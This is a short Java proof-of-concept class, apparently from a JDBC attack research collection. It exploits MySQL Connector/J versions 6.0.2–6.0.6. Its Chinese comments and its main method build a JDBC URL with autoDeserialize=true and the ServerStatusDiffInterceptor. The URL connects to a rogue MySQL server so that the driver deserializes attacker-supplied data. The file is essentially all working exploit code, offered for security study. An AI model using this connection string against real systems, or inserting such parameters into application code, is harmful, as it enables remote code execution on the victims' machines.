package org.su18.jdbc.attack.mysql.serverstatus;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/4ra1n/mysql-fake-server 进行测试
 * 依赖版本 6.0.2
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 statementInterceptors
 * 连接参数 autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
 * 从此版本包名多了 cj
 * 备注 影响版本 6.0.2 - 6.0.6
 *
 * @author Jasper
 */
public class Attack6x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://127.0.0.1:49435/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "deser_CUSTOM", "");
	}

}
